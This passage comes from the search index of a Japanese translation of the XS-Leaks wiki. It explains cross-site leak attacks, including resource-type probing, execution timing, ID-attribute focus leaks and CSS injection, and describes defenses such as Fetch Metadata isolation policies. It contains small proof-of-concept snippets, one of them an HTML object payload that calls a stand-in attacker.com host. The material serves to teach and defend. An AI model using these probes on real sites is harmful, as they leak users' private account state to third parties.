async function isType(url, type = \u0026#34;script\u0026#34;) { let error = false; // urlをパージする await ifCached(url, true); // リソースの読み込みを試行 let e = document.createElement(type); e.onerror = () =\u0026gt; error = true; e.src = url; document.head.appendChild(e); // CORBで許可されていれば、キャッシュされるのを待つ await new Promise(resolve =\u0026gt; setTimeout(resolve, 500)); // クリーンアップ document.head.removeChild(e); // ブロックされた\u0026#34;images\u0026#34;の修正 if (error) return false return ifCached(url); } getComputedStyleは、現在のページに埋め込まれたCSSスタイルシートを読み取るために使用することができます。 これは異なるオリジンから読み込まれたものも含みます。 この関数は、ボディに適用されたスタイルがあるかどうかをチェックするだけのものです。
async function isCSS(url) { let link = document.createElement(\u0026#39;link\u0026#39;); link.rel = \u0026#39;stylesheet\u0026#39;; link.type = \u0026#39;text/css\u0026#39;; link.href = url; let style1 = JSON.stringify(getComputedStyle(document.body)); document.head.appendChild(link); await new Promise(resolve =\u0026gt; setTimeout(resolve, 500)); let style2 = JSON.stringify(getComputedStyle(document.body)); document.head.removeChild(link); return (style1 !== style2); } PDF # Open URL Parametersには、zoom, view, page, toolbar などのコンテンツを制御することができるものが用意されています。 chromeの場合、内部でembedを使用しているため、frame countingでPDFを検出することが可能です。
async function isPDF(url) { let w = open(url); await new Promise(resolve =\u0026gt; setTimeout(resolve, 500)); let result = (w.length === 1); w.close(); return result; } warning
} ページに他の埋め込みがある場合、誤検知が発生します。 スクリプトタグ # クロスオリジンのスクリプトがページに含まれる場合、その内容を直接読み取ることはできません。 しかし、スクリプトが組み込み関数を使用している場合には、関数を上書きすることでその引数を読むことができるため、機密情報をリークする可能性があります1。
let hook = window.Array.prototype.push; window.Array.prototype.push = function() { console.log(this); return hook.apply(this, arguments); } Javascriptが使用できない場合 # JavaScriptが無効な場合でも、クロスオリジンのリソースに関するいくつかの情報が漏えいする可能性があります。 例えば、\u0026lt;object\u0026gt; を利用して、リソースがエラーコードで応答するかどうかを検出することができます。 リソース//example.org/resourceが\u0026lt;object data=//example.org/resource\u0026gt;fallback\u0026lt;/object\u0026gt;でエラーを返した場合、fallbackがレンダリングされます2 3。
内部に別の\u0026lt;object\u0026gt;を挿入して情報を外部サーバにリークしたり、CSS4で検出したりすることができます。
以下のコードは //example.org/404 を埋め込み、それが Error で応答した場合、 フォールバックとして//attacker.com/?error へのリクエストも行われます。
\u0026lt;object data=\u0026#34;//example.com/404\u0026#34;\u0026gt; \u0026lt;object data=\u0026#34;//attacker.com/?error\u0026#34;\u0026gt;\u0026lt;/object\u0026gt; \u0026lt;/object\u0026gt; 対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies Type leaks ✔️ ❌ ❌ RIP 🔗 NIP 参考文献 # The Unexpected Dangers of Dynamic JavaScript. link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
HTML Standard, [3.2.5.2.6 Embedded content], link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
https://twitter.com/terjanq/status/1180477124861407234\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:18,href:"/docs/defenses/isolation-policies/navigation-isolation/",title:"Navigation Isolation Policy",section:"Isolation Policies",content:`Navigation Isolation Policy は、クロスサイトウィンドウコンテキストを利用した CSRFやクリックジャッキング、反射型XSS、XS-Leak を緩和することを目的としたサーバーサイドの保護機構です。これは厳格なポリシーであり、ハイパーリンクを介した遷移を含むすべてのクロスサイトの遷移をブロックするため、アプリケーションを破壊する可能性があります。
tip
すべてのクロスサイトインタラクションを拒否する代わりに、ユーザーにアクションを確認するよう促すことができます。例えば、このページを信頼できる発信元から訪れたことを確認することで 、バックグラウンドでの攻撃のリスクを軽減し、同時にアプリケーションの意図しない破壊を防ぐのに役立ちます。 Fetch Metadataを用いた実装 # 以下のコードは、Fetch Metadata ヘッダーを使用した Navigation Isolation Policy の実装例を示しています1:
# クロスサイトリクエストを拒否し、クリックジャッキングやXS-Leaks、他のバグから保護します def allow_request(req): # クロスサイトでないリクエストを許可する if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;] != \u0026#39;cross-site\u0026#39;: return True # ホームページなど、遷移されることを意図したエンドポイントへのリクエストを許可する if req.path in whitelisted_paths: return True # 埋め込みを含むすべてのトップレベルクロスサイトの遷移をブロックする if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-mode\u0026#39;] in (\u0026#39;navigate\u0026#39;, \u0026#39;nested-navigate\u0026#39;): return False # その他のリクエストを許可する return True 参考文献 # Fetch Metadata Request Headers playground, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:19,href:"/docs/attacks/timing-attacks/execution-timing/",title:"Execution Timing",section:"Timing Attacks",content:`ブラウザ上でのJavaScriptの実行時間を測定することで、攻撃者は特定のイベントがいつ発生したか、ある操作にどれくらいの時間がかかったかといった情報を得ることができます。
イベントループのタイミング # JavaScriptの並行処理モデルは、single-threaded event loopに基づいており、これは一度に一つのタスクしか実行できないことを意味します。 例えば、ある時間のかかるタスクがイベントループをブロックした場合、UIスレッドが枯渇した結果として、ユーザーはページがフリーズしたように感じることがあります。 他のタスクはブロックされたタスクが終了するまで待たなければなりません。 各ブラウザは異なるプロセスモデルを実装しているので、ウェブサイトによっては、その関係によって異なるスレッド（およびイベントループ）で実行されることがあります。
このモデルを悪用して、クロスオリジンページから秘密を盗みだす手法があります。
イベントプールで次に実行されるまでの時間を測定することで、異なるオリジンのコードが実行されるまでの時間を推測する。攻撃者は固定されたプロパティを持つイベントをイベントループ12に送り続け、プールが空になると最終的にディスパッチされます。他のオリジンは同じプールにイベントをディスパッチし、ここで攻撃者はそのタスクの一つで遅延が発生したかどうかを検出することで、時間差を推測します。 攻撃者が制御する文字列によって前記の機密情報が比較される場合、クロスオリジンページから機密情報を盗む。このリークは、1文字ずつの文字列比較2のイベントループで時間差を比較した結果です（前出の手法を使用）。process isolationを行わないブラウザでは、異なるオリジン間のクロスウィンドウ通信が同じスレッドで実行され、同じイベントループを共有します。 important
process isolationの仕組みがあるブラウザでは、後者の攻撃の可能性はすでにありません。このような仕組みは、現在Chromiumベースのブラウザでは Site Isolationのみで、Firefox にはProject Fission という名前で間もなく導入される予定です。 Busy Event Loop # 別の手法として、スレッドのイベントループをブロックし、イベントループが再び利用可能になるまでの時間を計測する方法があります。 この手法の主な利点の1つは、攻撃者のオリジンが他のオリジンの実行に影響を与えることができるため、Site Isolationを回避できることです。この攻撃は次のように動作します。
対象のウェブサイトをwindow.openで別ウィンドウに表示するか、iframe内に表示する。(Framing Protectionsが設定されていない場合) 長い計算が始まるのを待つ。 Framing Protectionsに関係なく、同じサイトのページをiframe内に読み込む 攻撃者は、(手順3の)iframeがonloadイベントをトリガーするのにかかった時間を計ることで、ターゲットのウェブサイトが実行された時間を検出できます。(Network Timing of step 3 should be minimal) 両方のナビゲーションは同じコンテキストで発生し、それらは同じサイトであるため、同じスレッドで実行され、同じイベントループを共有します。（それらは互いにブロックすることができます。）
// 新しいウィンドウを開いて、example.comのイベントループを // ウィンドウがブロックする時間を測定する window.open(\u0026#39;https://example.org/expensive\u0026#39;); // TODO: タイムアウトなどでコストの掛かるウィンドウがロードされるのを待ちます。 var ifr = document.createElement(\u0026#39;iframe\u0026#39;); ifr.src = \u0026#34;https://example.org\u0026#34;; document.body.appendChild(ifr); // 初期時間の測定 var start = performance.now(); ifr.onload = () =\u0026gt; { // iframeが読み込まれたら、時間差を計算する var time = performance.now() - start; console.log(\u0026#39;It took %d ms to load the window\u0026#39;, time); } サービスワーカー # サービスワーカーは、ウェブアプリケーションにオフラインソリューションを提供するために使用できますが、攻撃者によってJavaScriptの実行タイミングを計測するために悪用される可能性があります3。サービスワーカーは、ブラウザとネットワークの間のプロキシとして機能し、アプリケーションがメインスレッド（document）によるあらゆるネットワークリクエストを傍受することを可能にします。
タイミングを測定するために、攻撃者は以下の手順を実行することができます。
攻撃者は自分のドメイン(attacker.com)の1つにサービスワーカーを登録する。 メインドキュメントで、攻撃者はターゲットウェブサイトへのナビゲーション（window.open）を発行し、サービスワーカーにタイマーを起動するよう指示する。 新しいウィンドウのロードが始まると、手順2で取得した参照をサービスワーカーが処理するページに移動させます。 手順3で実行したリクエストがサービスワーカーに到着すると、サービスワーカーは204（No Content）レスポンスを返し、ナビゲーションを中止する。 この時点で、サービスワーカーは、ステップ2で開始したタイマーの計測値を収集します。この測定値は、JavaScriptがどれくらいの時間ナビゲーションをブロックしたかに影響されます。 実際にはナビゲーションは発生しないので、ステップ3から5を繰り返して、連続したJavaScriptの実行タイミングについてより多くの測定値を得ることができます。
jQuery、CSSセレクタ、そしてShort-circuit Timing # 攻撃者は、CSS セレクタのもう一つの興味深い挙動である、式のshort-circuit（短絡評価）を悪用することができます。この式はURLハッシュで受け取られ、ページjQuery(location.hash)4を実行したときに評価されます。
セレクタ main[id='site-main'] がマッチせず評価に失敗すると、実行に時間のかかるセレクタの他の部分 (*:has(*:has(*:has(*))))) は無視されます (and 演算子と同じような感じですが、逆です) ので、タイミング攻撃が可能です。
\$(\u0026#34;*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id=\u0026#39;site-main\u0026#39;]\u0026#34;) tip
process isolation機構を持つブラウザでは、サービスワーカーを悪用して実行タイミング計測を取得したり、Busy Event Loop tricksなどでprocess isolationを回避できます。 ReDoS # warning
この一連のXS-Leaksは、ターゲットページにRegexを注入することを必要とします。 正規表現サービス拒否（ReDoS）とは、ユーザー入力として正規表現を許可しているアプリケーションにおいて、サービス拒否を引き起こす手法です 2 5。悪意を持って細工された正規表現を指数関数的な時間で実行させることができます。これは、ページ上のデータによって異なる実行時間を持つ正規表現を注入することができる場合、XS-リークのベクトルとして使用することができます。これは、クライアントサイドまたはサーバーサイドで起こり得ます。
対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies T. Event Loop ❌ ❓ ❌ NIP Service Workers ✔️ ✔️ ❌ NIP jQuery ✔️ ❌ ❌ NIP ReDoS ✔️ ❌ ❌ NIP Busy Event Loop ✔️ ✔️ ❌ NIP 参考文献 # Loophole: Timing Attacks on Shared Event Loops in Chrome, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Matryoshka - Web Application Timing Attacks (or.. Timing Attacks against JavaScript Applications in Browsers), link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Security: XS-Search + XSS Auditor = Not Cool, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
A timing attack with CSS selectors and Javascript, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
A Rough Idea of Blind Regular Expression Injection Attack, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:20,href:"/docs/attacks/timing-attacks/hybrid-timing/",title:"Hybrid Timing",section:"Timing Attacks",content:`ハイブリッド・タイミング攻撃では、攻撃者は最終的なタイミング測定に影響を与える一連の要素の合計を測定することができます。これらの要素には以下のものがあります。
ネットワークの遅延 ドキュメントのパース サブリソースの検索と処理 コード実行 アプリケーションによって値が異なる要素もあります。つまり、Network Timing はバックエンドの処理が多いページでより重要かもしれませんし、一方 Execution Timing はブラウザ内でデータを処理し表示するアプリケーションでより重要かもしれないのです。攻撃者は、より正確な測定値を得るために、これらの要因のいくつかを排除することも可能です。例えば、攻撃者はページを iframe として埋め込むことによってすべてのサブリソースを事前にロードし（ブラウザにサブリソースをキャッシュさせる）、その後、それらのサブリソースの取得によって生じる遅延を除外した2度目の計測を行えます。
Frameタイミング攻撃(Hybrid) # ページがFraming Protectionsを設定していない場合、攻撃者はすべての要素を考慮したハイブリッドな計測結果を取得できます。この攻撃はNetwork-based Attackと似ていますが、リソースが取得されると、ブラウザによってページがレンダリングされて実行されます（サブリソースの取得と JavaScript の実行が行われる）。このシナリオでは、onloadイベントは（サブリソースとスクリプトの実行を含めて）ページが完全にロードされたときだけトリガーされます。
var iframe = document.createElement(\u0026#39;iframe\u0026#39;); // 配送先のWebサイトのURLを設定する iframe.src = \u0026#34;https://example.org\u0026#34;; document.body.appendChild(iframe); // リクエストが初期化されるまでの時間を計測する var start = performance.now(); iframe.onload = () =\u0026gt; { // iframeが読み込まれたら、時間差を計算する var time = performance.now() - start; console.log(\u0026#34;The iframe and subresources took %d ms to load.\u0026#34;, time) } 対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies Frame Timing (Hybrid) ✔️ ❌ ✔️ FIP `}),e.add({id:21,href:"/docs/attacks/id-attribute/",title:"ID Attribute",section:"攻撃手法",content:`id属性はHTML要素を識別するために広く利用されています。残念ながらクロスオリジンのウェブサイトでfocusイベントとURLフラグメントを利用することによって、ページのどこにid属性が与えられているかを決定することができます。例えば、https://example.com/foo#barが読み込まれると、ブラウザはid=\u0026quot;bar\u0026quot;が与えられた要素までスクロールしようとします。これはクロスオリジンのサイトで定義したiframeでhttps://example.com/foo#barを読み込むことによって検出することができます。もし、 id=\u0026quot;bar\u0026quot; を持つ要素がある場合は、 focus イベントが発生します。 focus イベントもまた同じ目的で使用することができます1。
いくつかのウェブアプリケーションはfocusable要素にid属性を設定しており、ユーザ情報の開示につながります。これらのid属性には、ユーザに直接関連する機密情報やユーザの状態（アカウントの状態）に関連する情報を含めることができます。
コード # 以下のコードは別のサイトからID属性を検出する例を示しています：
// onblurイベントをリッスン onblur = () =\u0026gt; { alert(\u0026#39;Focus was lost, so there is a focusable element with the specified ID\u0026#39;); } var ifr = document.createElement(\u0026#39;iframe\u0026#39;); // ページに id=\u0026#34;x\u0026#34; のフォーカス可能な要素がある場合、フォーカスを得ることができます。 // 例： \u0026lt;input id=\u0026#34;x\u0026#34; value=\u0026#34;test\u0026#34; /\u0026gt; ifr.src = \u0026#39;https://example.org/#x\u0026#39;; document.body.appendChild(ifr); info
上記の手法はFireFoxではうまく動作しない可能性があります。 攻撃シナリオ # id属性を利用した攻撃は以下のような物があります。
とある銀行がモバイルデバイスのセッションを認証するために短い数字のワンタイムPin(OTP)を生成することを許可しています。この銀行のページはクライアントにPINコードを表示するためのbutton要素のidにOTPコードそのものを使用していました。この挙動を悪用し、すべてのオプションをブルートフォースすることでOTPコードを窃取し、ユーザアカウントを侵害することができます。 とあるウェブアプリケーションが、プレミアムアカウントのステータスを持つユーザや、特定の性別のユーザである場合、あらかじめ定義されたidとHTML要素の組み合わせを利用します。攻撃者は、被害者のページに特定のidがあるかを検出し、被害者のアカウント情報を漏えいさせることができます。 対策 # Document Policies SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ✔️ ✔️ ✔️ ❌ FIP 参考文献 # Leaking IDs using focus, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:22,href:"/docs/attacks/postmessage-broadcasts/",title:"postMessage Broadcasts",section:"攻撃手法",content:`アプリケーションは、他のオリジンと情報を共有するために、しばしば postMessage broadcasts を使用します。 postMessage を使うと、2種類の XS-Leaks につながる可能性があります。
信頼できない発信元と機密性の高いメッセージを共有すること
postMessage API は targetOrigin パラメータをサポートしており、これを使用してメッセージを受信できるオリジンを制限することができます。メッセージに機密性の高いデータが含まれている場合、このパラメータを使用することが重要です。 変化するコンテンツやブロードキャストの存在に基づいた情報のリーク
他の XS-Leak のテクニックと同様に、これはオラクルを形成するために使われる可能性があります。例えば、特定のユーザ名を持つユーザが存在する場合にのみ、アプリケーションが「Page Loaded」という postMessage ブロードキャストを送信すると、これを利用して情報をリークすることができます。 対策 # この XS-Leak は、postMessage のブロードキャスト送信の目的に深く依存するため、明確な解決策はありません。 アプリケーションは、postMessage の通信を既知の送信元グループに制限する必要があります。 これが不可能な場合、攻撃者が通信間の違いに基づいて情報を推論するのを防ぐために、ユーザの状態に関係なく通信が一貫して同じ動作をする必要があります。
References # `}),e.add({id:23,href:"/docs/defenses/isolation-policies/",title:"Isolation Policies",section:"対策の仕組み",content:` Isolation Policies # このセクションでは、異なる種類のクロスサイトインタラクションに対する、isolation policies の形で提示された対策について説明します:
Fetch Metadataを使った共通のリソース（スクリプト、画像、フェッチなど）に対するクロスサイトリクエストを防御するには、Resource Isolation Policyを確認してください。 Fetch Metadataでクロスサイトのフレーミングから守るには、Framing Isolation Policyを確認してください。 Fetch Metadata を使ったクロスサイト ナビゲーショナル リクエストを防御するには、Navigation Isolation Policyを確認してください。 Fetch Metadata、SameSite Cookie、またはRefererヘッダーのいずれかによるすべてのクロスサイトの相互作用を防御するには、Strict Isolation Policyを確認してください。 `}),e.add({id:24,href:"/docs/defenses/isolation-policies/strict-isolation/",title:"Strict Isolation Policy",section:"Isolation Policies",content:`Strict Isolation Policyは、すべてのクロスサイトインタラクション（ハイパーリンクを介したアプリケーションへの遷移を含む）から保護することを目的としています。これは非常に厳しいポリシーであり、アプリケーションが正常に機能しなくなる可能性があります。
tip
すべてのクロスサイトインタラクションを拒否する代わりに、ユーザーにアクションを確認するよう促すことができます。例えば、このページを信頼できる発信元から訪れたことを確認することで 、バックグラウンドでの攻撃のリスクを軽減し、同時にアプリケーションの意図しない破壊を防ぐのに役立ちます。
しかし、他のリソースはバックグラウンドで読み込まれるため、これは遷移のリクエストに対してのみ機能します。
Fetch Metadataを用いた実装 # 以下のコードは、アプリケーションによる Strict Isolation Policy の実装例を示しています:
# クロスオリジンリクエストを拒否し、CSRFやXSSI、他のバグから保護します def allow_request(req): # Fetch Metadataを送信しないブラウザからのリクエストを許可する if not req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;]: return True # cross-siteリクエストをブロック if req[\u0026#39;headers\u0026#39;][\u0026#39;sec-fetch-site\u0026#39;] == \u0026#39;cross-site\u0026#39;: return False # その他のリクエストを許可する return True SameSite cookiesを用いた実装 # もしサーバーがSameSite=strictフラグを持つCookieを送ると、このコードで示されるように、そのCokkieを含まないで返される全てのリクエストは拒否されることがあります。
# クロスオリジンリクエストを拒否し、CSRFやXSSI、他のバグから保護します def allow_request(req): if req[\u0026#39;cookies\u0026#39;][\u0026#39;strict-cookie\u0026#39;] == \u0026#39;true\u0026#39;: return True # strict Cookieを持たないリクエストはブロック return False Refererを用いた実装 # また、Referer ヘッダーを使用して、信頼できない送信元からのリクエストを拒否することも可能です:
# 信頼できないリファラーから来たリクエストを拒否する def allow_request(req): # referer ヘッダが信頼できるかどうかを確認する。つまりtrusted_referers ディクショナリに存在するかどうかを確認する。 if req[\u0026#39;headers\u0026#39;][\u0026#39;referer\u0026#39;] in trusted_referers: return True # strict Cookieを持たないリクエストをブロック return False important
すべてのリクエストに Referer ヘッダが含まれることは保証されていません (たとえば、拡張機能でヘッダを取り除くことができます)。また、Referer の値を null に設定することも可能であることに注意してください。
Twitterは、XS-Leaksに対して同様の防御策を導入1しています。
Silhouetteからユーザーアイデンティティを保護する, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:27,href:"/docs/attacks/experiments/",title:"Experiments",section:"攻撃手法",content:` Experiments # このセクションでは、実験的な機能に影響を与えるXS-Leaksを紹介します。実験的な機能は、通常ブラウザの環境設定フラグの下に隠されており、その正確な仕様は活発に議論されている最中です。XS-Leaksを防ぐためには、これらの機能を認識し、実装の初期段階からその開発をフォローすることが重要です。
`}),e.add({id:28,href:"/docs/defenses/secure-defaults/",title:"Secure Defaults",section:"対策の仕組み",content:` 安全なデフォルト # このセクションには、2種類の安全なデフォルトについて説明している記事を掲載しています。
Partitioned Caches – キャッシュリソースを異なるサイト間で共有できないようにします。 Cross Origin Read Blocking (CORB) – 特定の種類のレスポンスが特定のクラスのリクエストによって参照されるのを防ぎます。 `}),e.add({id:29,href:"/docs/attacks/css-injection/",title:"CSS Injection",section:"攻撃手法",content:` CSSインジェクション # warning
ここで紹介される一連のXS-Leaksは対象ページでのCSSインジェクションを必要とします。 CSSインジェクションの様々なベクトルの中で、最もよく見られるのは、CSSセレクタの悪用です。これらは、特定のHTML要素にマッチし、選択するための表現として使用することができます。例えば、セレクタ input[value^=\u0026quot;a\u0026quot;] は、input タグの値が文字 \u0026ldquo;a\u0026rdquo; で始まっている場合にマッチングされます。したがって、ある CSS セレクタが表現にマッチするかどうかを検出するため、攻撃者は background や @import などのプロパティを使用して、自身の管理するウェブサイトへのコールバックをトリガーすることができます。1 2 このマッチングプロセスは簡単にブルートフォースされ、文字列全体に拡張できます。
文字の並びに独自の表記がある場合、フォントの合字を悪用して、ページに含まれるJavaScriptなどがリークされる可能性があります。
* { display: block; }のようなスタイルを適用すると、styleやscriptなどの通常は隠されているHTMLタグも、テキストとして表示されることがあります。したがって、それらの内容もリークされる可能性があります。
対策 # 攻撃者がコントロールするコンテンツを独立したドキュメントに置きます。これは srcdoc属性を持つiframeを使って行うことができます。オプションで、コンテンツを独自のオリジンに分離するためのサンドボックス属性を含めることができます。 CSSインライナーを使って、グローバルなスタイルが変換されるようにします。 SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ❌ ❌ ❌ ❌ References # CSS Injection Primitives, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
HTTPLeaks, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:30,href:"/docs/defenses/",title:"対策の仕組み",section:"Docs",content:` 対策の仕組み # XS-Leaks Attack Vectors をすべて対策することは容易ではありません。攻撃ベクトルの一つ一つは異なるウェブやブラウザのコンポーネントに影響を与え、そしてそれには癖があります。Google VRPのような一部のバグバウンティプログラムは彼らが大規模な改修に注力するために新しいXS-Leaksの報告に対して支払いを停止しました。1 Googleなどの他の多くの企業はXS-Leaksを修正するには、アプリケーションがXS-Leaks全カテゴリを緩和するのに有効な new large scale mitigations and changes to the web platform に時間とエンジニアリングを投資が正しいアプローチだと信じています。
現在ブラウザはXS-Leaksを軽減するために使用できるオプトインの仕組みを多数提供しています。これらは強力な保護機能を提供しますが、すべてのブラウザでまだ十分にサポートされていないことが欠点です。XS-Leaksを効果的に対策するためには、様々な手法を組み合わせる必要があります。
オプトインの仕組み # これらの defense mechanisms によってアプリケーションは類似した XS-Leaks に一括に対応することができます。これらの防御は、アプリケーションがブラウザの挙動を変更できるようにするか、あるいはアプリケーション自身の動作を変更するために使用できる追加情報を提供することです。
tip
オプトインによる防御の仕組みはデフォルトの戦略であるべきです。XS-Leaksに対してだけでなく、XSSI、クリックジャッキング、CSRFといった他の脆弱性に対しての対策にもなります。 important
ブラウザのサポートに依存する緩和策を使用する場合、ユーザのブラウザで十分にサポートされていることを必ず確認してください。例えば fetch metadata ヘッダは素晴らしいツールですが現在はChromiumベースのブラウザだけでしかサポートされていません。異なる仕様に対するブラウザサポートの最新情報については、MDNを確認してください。 アプリケーションの設計 # アプリケーションの設計手法はXS-Leaksをアプリケーションの設計段階で防止する方法に重点を置いています。これは、より強力で全体的な保護をすぐに有効にすることが現実的でない場合に、非常に有用なアプローチです。もう一つの大きな利点は、最新のブラウザ仕様をサポートしていない古いブラウザでも、注意深くアプリケーションを設計することでXS-Leaksを阻止できることです。
note
アプリケーションの設計技術を使って、アプリケーション全体ですべてのXS-Leak技術を防御することは極めて困難です。 アプリケーション設計の手法は深刻なリークを防ぐのに有効ですが、ブラウザが提供するopt-in mechanisms は全体的な解決策として優れています Secure Defaults # ブラウザベンダーは、このWikiで言及されている いくつかのXS-Leaksの影響を緩和するためにdefault behaviorsを変更することに積極的に取り組んでいます。ブラウザのデフォルトの動作を変更することはセキュリティの向上と後方互換性維持の間でバランスをとることです。 important
セキュアデフォルトは素晴らしいものです！開発者が更に努力することなくアプリケーションとユーザを保護することができます。しかし、XS-Leaksを完全に防ぐことはできないので注意してください。 参考文献 # Google Bughunter University - XSLeaks and XS-Search, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:31,href:"/docs/attacks/historical/",title:"Historical",section:"攻撃手法",content:` Historical Attacks # このセクションの記事では、ブラウザー内で対処されて機能しなくなった XS-Leak について説明します。 次のようなさまざまな緩和戦略が適用されました。
一部の強力な API の精度を低下させる 特定の測定値にノイズを追加して、悪意のある推論を防止 機能と API の廃止と削除 機能の動作を変更 `}),e.add({id:32,href:"/docs/contributions/",title:"Contributions",section:"Docs",content:` Contributions # This page explains how you can contribute to the XS-Leaks wiki and acknowledges the users who have contributed content.
Contribution guidelines # The article source files reside in the /content directory in the wiki repository.
You can make changes to articles in various ways:
Pull requests # In order to submit a pull request:
Fork the repository. Make changes there and place them into a pull request. Submit the pull request of the branch to master in the main folder. If you are not sure about the folder structure, you can look up how other articles were written.
Direct edits # Under every article, there is an Edit this article anchor which redirects you straight to the GitHub editor.
Github issues # If neither of the above options work for you, we\u0026rsquo;d appreciate if you created a new issue in the main wiki repository where you can explain the improvement, issue, or any other comment you have regarding the current version of the wiki.
Local deployment # The wiki is built using the Hugo framework.
You can run a local environment by following these steps:
Install the Hugo Framework, extended version \u0026gt; 0.68. Clone this repo. Run hugo server --minify in the root directory. Open your browser and go to http://localhost:1313 (or as indicated by the Hugo output). Wiki theme # We use the Hugo Book Theme with custom modifications.
Custom hint shortcode # We modified the default Hints used by the theme; the modified boxes are listed below:
info
This is an Info box for the \` info
\` shortcode. note
This is a Note box for the \` note
\` shortcode. example
This is an Example box for the \` example
\` shortcode. tip
This is a Tip box for the \` tip
\` shortcode. important
This is an Important box for the \` important
\` shortcode. warning
This is a Warning box for the \` warning
\` shortcode. Original style # The original hint style can be used by adding a third parameter, noTitle, to the shortcode, e.g.:
\` \` Acknowledgements # We would like to thank the following users who contributed to this XS-Leaks wiki:
Manuel Sousa, terjanq, Roberto Clapis, David Dworken, NDevTK, 1lastBr3ath, Brasco, rick.titor, Chris Fredrickson, jub0bs
In addition, we would also like to acknowledge the users who contributed to the predecessor of the current XS-Leaks wiki:
Eduardo\u0026rsquo; Vela\u0026quot; \u0026lt;Nava\u0026gt; (sirdarckcat), Ron Masas, Luan Herrera, Sigurd, larson reever, Frederik Braun Masato Kinugawa, sroettger
And finally, our thanks go to all other amazing researchers that participate in sharing and exploring the depths of XS-Leaks!
`}),e.add({id:34,href:"/docs/defenses/opt-in/fetch-metadata/",title:"Fetch Metadata",section:"Opt-In Mechanisms",content:`Fetch Metadata Request Headers は、ブラウザが HTTPS リクエストで送信するヘッダです。これらのヘッダは、リクエストがどのように発生したかについてのコンテキストを提供し、アプリケーション側がそれに対してどのように応答するかについて、より多くの情報に基づいた決定を行うことができるようにします。これにより、サーバーは潜在的な攻撃（例：予期しないクロスオリジンリクエスト）を検知した際に、異なる動作をすることができます[^1]。これは、サーバーに厳格なポリシーが導入されていれば、XSSI、XS-Leaks、クリックジャッキング、CSRF などのクロスオリジン攻撃に対して非常に効果的です。
XS-Leaksのシナリオでは、サーバーはリクエストがいつクロスオリジン（例：攻撃者のオリジン）で行われたかを知る能力を持ち、ユーザーデータを含まないような別のレスポンスを返すことができます。この種のレスポンスは、ユーザーに関するいかなる情報または状態も提供しないため、攻撃者にとって有用ではなくなります。Fetch Metadataはまた、フレーミングや遷移のリクエストをブロックするために使用することができます。
important
セキュリティ上の理由から、Fetch Metadataヘッダは暗号化されたリクエスト（HTTPS）にのみ付与されます。 Fetch Metadata vs. SameSite cookie # Fetch Metadata ヘッダは、SameSite Cookieによって提供される保護を拡張するために使用することができます。Fetch Metadata ヘッダと SameSite Cookieの両方がクロスサイトリクエストを拒否するために使われることがありますが Fetch Metadata は以下のような要素に基づいて、より情報に基づいた決定をすることができます。
リクエストはSame Origin（同一生成元）か、Same Site（同一サイト）か リクエストはどのように開始されたか(例: fetch、スクリプト、トップナビゲーション) リクエストはユーザの操作によって発生したのか リクエストはブラウザによって発生したか（例：オムニボックスに直接URLを入力する） これは、SameSite Cookieがサービスの機能を壊す可能性があるシナリオにおいて、より正確な保護の展開を可能にします。SameSite Cookieと比較した Fetch Metadata の欠点は、前者が暗号化されていないリクエスト(HTTP)も保護できるのに対し、後者がそうできないことです。
考察 # Fetch Metadataヘッダは徹底した防護戦略のための有用なツールですが、 SameSite Cookies, COOP, あるいは Framing Protections といった仕組みの代わりとして見なされるものではありません。たとえFetch Metadataヘッダを使用して同様の結果を得ることができるとしても、サーバに加えてクライアント側でもこれらの制限を実施することが最善です。
Fetch Metadataヘッダの有用性は、アプリケーションの対象範囲とデプロイの正しさに依存します。
ポリシー # Fetch Metadata Request Headers を利用した特定のポリシーについては Resource Isolation Policy と [Framing Isolation Policy](https://xsleaks.dev/docs/defenses/isolation-policies/framing-isolation/ を参照してください。
`}),e.add({id:35,href:"/docs/defenses/design-protections/cache-protections/",title:"Cache Protections",section:"Application Design",content:`cache probingをベースとしたXS-Leakを対策するために、アプリケーションで利用できるさまざまなアプローチがあります。 これらのアプローチについて、以下のセクションで説明します。
Cache-Controlヘッダによるキャッシュ保護 # キャッシングを無効化することが許容できる場合には、cache probing攻撃に対する強力な対策となります。 キャッシュを無効化すると、リソースを読み込むたびに、リソースを再度フェッチする必要があります。 キャッシュを無効化するには、保護したいすべてのレスポンスに Cache-Control：no-storeヘッダを設定します。
メリット：
すべての主要なブラウザでサポートされている デメリット:
Webサイトのパフォーマンスに悪影響を与える ランダムなトークンによるキャッシュ保護 # キャッシュの無効化ではなく、cache probing攻撃を対策するために、アプリケーションがURLに追加のデータを含める方法もあります。 これは、参照するすべてのサブリソースのURLにランダムなトークンを含めることで実現できます。 攻撃者がこのランダムなトークンを推測できなければ、単純な手法では、攻撃者はキャッシュ内にアイテムがあるかを判断できません。
example
アプリケーションのすべてのページにユーザのプロフィール写真 /user /\u0026lt;USERNAME\u0026gt;.png が読み込まれるとします。 攻撃者は /user/john.png , /user/jane.png などのキャッシュを調査することにより、どのユーザがサインインしているかを判定できます。
